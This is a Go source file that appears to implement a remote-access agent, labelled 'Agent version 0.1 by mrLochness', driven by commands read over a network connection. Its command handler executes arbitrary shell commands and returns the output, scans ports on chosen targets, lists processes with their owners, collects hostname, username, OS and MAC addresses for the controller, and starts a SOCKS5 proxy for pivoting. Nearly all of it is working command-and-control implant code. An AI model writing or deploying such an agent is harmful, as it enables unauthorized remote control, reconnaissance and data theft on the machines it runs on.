package utils

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"os/user"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/armon/go-socks5"
)

type Config struct {
	PortsToScan []int
	Delay       int
	Timeout     int    `default:"3"`
	Target      string `default:"127.0.0.1"`
}

type InitConf struct {
	Host       string
	Port       int
	Connection net.Conn
}

type Process struct {
	Name string
	PID  int
	UID  int
}

type SessionIdentifier struct {
	OS         string
	Username   string
	OsVersion  string
	any1       any
	Hostname   string
	MACAddress []string
}

var Conf = InitConf{}
var Verbose bool

func (proc Process) ToString() string {
	ret := fmt.Sprintf("%s		%d		%d\n", proc.Name, proc.PID, proc.UID)
	return ret
}
func GetProcesses() {
	processList := []Process{}
	files, err := ioutil.ReadDir("/proc")
	var re = regexp.MustCompile(`(?m)Uid:(\s\s\s\s([0-9]{4})){4}`)

	if err != nil {
		panic(err)
	}
	for _, file := range files {
		proc := Process{}
		pid, err := strconv.Atoi(file.Name())
		if err != nil {
			continue
		}
		proc.PID = pid

		name, err := ioutil.ReadFile("/proc/" + file.Name() + "/comm")
		if err != nil {
			continue
		}
		proc.Name = string(name)
		processList = append(processList, proc)

		if err != nil {
			panic(err)
		}
		status, err := ioutil.ReadFile("/proc/" + strconv.Itoa(pid) + "/status")
		if err != nil {
			continue
		}
		str := string(status)
		for _, match := range re.FindAllString(str, -1) {
			user := strings.Fields(match)
			uid, err := strconv.Atoi(user[1])
			if err != nil {
				panic(err)
			}
			proc.UID = uid

		}
	}
	Conf.Connection.Write([]byte("\nNAME		PID		 UID"))
	Conf.Connection.Write([]byte("\n--------------------------\n"))
	for _, process := range processList {
		Conf.Connection.Write([]byte(process.ToString()))
	}

}

func GetPID(proc Process) int {
	return proc.PID
}

func GetName(proc Process) string {
	return proc.Name
}

func GetUID(proc Process) int {
	return proc.UID
}

func WriteClient(msg string) {
	Conf.Connection.Write([]byte(msg))
}

func StartProxy() { //WIP
	proxyConf := &socks5.Config{}
	server, err := socks5.New(proxyConf)
	if err != nil {
		if Verbose {
			WriteClient(err.Error())
		}
	}
	if err := server.ListenAndServe("tcp", "127.0.0.1:1080"); err != nil {
		if Verbose {
			WriteClient(err.Error())
		}
	}
	fmt.Printf("Starting proxy. PID %d\n", os.Getpid())
	Conf.Connection.Write([]byte(fmt.Sprintf("Starting proxy. PID %d\n", os.Getpid())))
}

func ScanPort(cnfg Config) error {
	var target string
	dialer := &net.Dialer{
		Timeout: time.Duration(time.Second * time.Duration(cnfg.Timeout)),
	}
	for _, port := range cnfg.PortsToScan {
		target = cnfg.Target + ":" + strconv.Itoa(port)
		Conf.Connection.Write([]byte(fmt.Sprintf("[!] Scanning port %d...\n", port)))
		conn, err := dialer.Dial("tcp", target)
		if conn != nil {
			defer conn.Close()
		}
		if err != nil {
			Conf.Connection.Write([]byte(fmt.Sprintf("[-] Closed port: %d\n", port)))
			if Verbose {
				WriteClient(err.Error())
			}
			continue
		} else {
			Conf.Connection.Write([]byte(fmt.Sprintf("[+] Found open port: %d\n", port)))
			continue
		}
	}
	return nil
}

func HandlePortScannerFlags(input string) Config {
	cnfg := Config{}
	r := regexp.MustCompile(`(-ports|-target|-delay|-time|--[a-zA-Z]+)\s+(\S+)`)
	matches := r.FindAllStringSubmatch(input, -1)
	if len(matches) == 0 {
		PortscanHelp(Conf.Connection)
	}
	for _, m := range matches {
		if strings.Contains(m[1], "-ports") {
			portarr := strings.Split(m[2], ",")
			for i, port := range portarr {
				portarr[i] = strings.TrimSpace(port)
			}
			var portarr_int []int
			for _, val := range portarr {
				cnv, err := strconv.Atoi(val)
				if Verbose {
					WriteClient(err.Error())
				}
				portarr_int = append(portarr_int, cnv)
				continue
			}
			cnfg.PortsToScan = portarr_int
		}
		if strings.Contains(m[1], "-delay") {
			delay_val, err := strconv.Atoi(m[2])
			if Verbose {
				WriteClient(err.Error())
			}
			cnfg.Delay = delay_val
		}
		if strings.Contains(m[1], "-target") {
			cnfg.Target = m[2]
		}
		if strings.Contains(m[1], "-time") {
			cnv, err := strconv.Atoi(m[2])
			if Verbose {
				WriteClient(err.Error())
			}
			cnfg.Timeout = cnv
		}
	}

	return cnfg
}

func getNetworkInfo() {
	var info string
	hostname, err := os.Hostname()
	if err != nil {
		if Verbose {
			WriteClient(err.Error())
		}
	}
	info += ("\n\tHostname: " + hostname) + "\n"

	ifaces, err := net.Interfaces()
	if err != nil {
		if Verbose {
			WriteClient(err.Error())
		}
	}
	info += "\t" + "=====================\n"
	info += "\t" + "Interfaces:\n"
	for _, iface := range ifaces {
		//Conf.Connection.Write([]byte(iface.Name))
		addresses, err := iface.Addrs()
		if err != nil {
			if Verbose {
				WriteClient(err.Error())
			}

		}
		if len(addresses) == 0 {
			continue
		}
		info += fmt.Sprintf("\n\tName: %s\n\t--------------------\n", iface.Name)

		for _, addr := range addresses {
			if len(addr.String()) > 0 {
				info += fmt.Sprintf("\tAddress: %s | Network: %s", addr.String(), addr.Network()) + "\n"
			} else {
				continue
			}
		}
	}
	Conf.Connection.Write([]byte(info))
}

func getAgentData() {
	info := SessionIdentifier{}
	user, err := user.Current()
	if err != nil {
		fmt.Println(err)
	}
	username := user.Username
	info.Username = username
	host, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	info.Hostname = host
	info.OS = runtime.GOOS
	ifaces, err := net.Interfaces()
	if err != nil {
		fmt.Println(err)
	}
	var addresses []string
	for _, iface := range ifaces {
		if iface.HardwareAddr.String() != "" {
			addresses = append(addresses, iface.HardwareAddr.String())
		}
	}
	info.MACAddress = addresses
	if runtime.GOOS == "windows" {
		// var (
		// 	kernel32     = syscall.NewLazyDLL("kernel32.dll")
		// 	getVersionEx = kernel32.NewProc("GetVersionExW")
		// 	verExInfo    = struct {
		// 		dwOSVersionInfoSize uint32
		// 		dwMajorVersion      uint32
		// 		dwMinorVersion      uint32
		// 		dwBuildNumber       uint32
		// 		dwPlatformId        uint32
		// 		szCSDVersion        [128]uint16
		// 	}{}
		// )
		// verExInfo.dwOSVersionInfoSize = uint32(unsafe.Sizeof(verExInfo))
		// r, _, _ := getVersionEx.Call(uintptr(unsafe.Pointer(&verExInfo)))
		// if r == 0 {
		// 	fmt.Println("failed to get windows version")
		// }
		// version := fmt.Sprintf("Windows %d.%d build %d platform %d\n", verExInfo.dwMajorVersion, verExInfo.dwMinorVersion, verExInfo.dwBuildNumber, verExInfo.dwPlatformId)
		version := "NOT IMPLEMENTED YET"
		info.OsVersion = version
	} else if runtime.GOOS == "linux" {
		// var sysinfo syscall.Utsname
		// if err := syscall.Uname(&sysinfo); err != nil {
		// 	fmt.Println(err)
		// }
		// version := fmt.Sprintf("Unix %s %s %s %s %s\n", byteToStr(sysinfo.Sysname[:]), byteToStr(sysinfo.Nodename[:]), byteToStr(sysinfo.Release[:]), byteToStr(sysinfo.Version[:]), byteToStr(sysinfo.Machine[:]))
		// info.OsVersion = version
		version := "NOT IMPLEMENTED YET"
		info.OsVersion = version
	}
	ser, err := json.Marshal(info)
	WriteClient(string(ser))
}

func byteToStr(b []int8) string {
	str := make([]byte, len(b))
	var i int
	for ; i < len(b); i++ {
		if b[i] == 0 {
			break
		}
		str[i] = uint8(b[i])
	}
	return string(str[:i])
}

func HandleConnection(conn net.Conn) {
	fmt.Println("in handleconn")
	for {
		line, err := bufio.NewReader(conn).ReadString('\n')
		fmt.Println(line)
		if err != nil {
			break
		}

		parts := strings.Split(strings.Replace(line, "\n", "", -1), " ")
		if len(parts) == 0 {
			continue
		}
		fmt.Println(parts[0])
		switch parts[0] {
		case "portscan":
			if len(parts) == 1 {
				PortscanHelp(conn)
				continue
			}
			cnfg := HandlePortScannerFlags(line)
			err := ScanPort(cnfg)
			if err != nil {
				conn.Write([]byte(fmt.Sprintf("Error: %v\n", err)))
			}
		case "shell":
			args := strings.Replace(parts[1], "\n", "", -1)
			cmd := exec.Command(args)
			output, err := cmd.CombinedOutput()
			if err != nil {
				conn.Write([]byte(err.Error()))
				continue
			}
			conn.Write(output)
		case "help":
			help := `
			net: shows network information
			portscan: scans ports on a given host
			shell: executes a shell command
			version: prints the agent version
			ps: shows all active processes and their respective owners
			exit: closes the connection
			` + "\n"
			conn.Write([]byte(help))
		case "version":
			conn.Write([]byte("Agent version 0.1 by mrLochness\n"))
		case "net":
			getNetworkInfo()
		case "ps":
			GetProcesses()
		case "proxy":
			go func() {
				proxyConf := &socks5.Config{}
				server, err := socks5.New(proxyConf)
				if err != nil {
					WriteClient(err.Error())
				}
				if err := server.ListenAndServe("tcp", "127.0.0.1:1080"); err != nil {
					WriteClient(err.Error())
				}
				fmt.Printf("Starting proxy. PID %d\n", os.Getpid())
				Conf.Connection.Write([]byte(fmt.Sprintf("Starting proxy. PID %d\n", os.Getpid())))
			}()
		case "info":
			getAgentData()
		default:
			conn.Write([]byte("Error: unknown command\n"))
		}
	}
	defer conn.Close()
}

func PortscanHelp(conn net.Conn) {
	helpmsg := `
	Missing arguments
		-ports=<ports>: ports to scan. for multiple ports, split using a period (,) (required)
		-delay=<time>: delay between requests
		-time=<time>: timeout in seconds
		-target=<target>: target to scan
	`
	conn.Write([]byte(helpmsg))
}
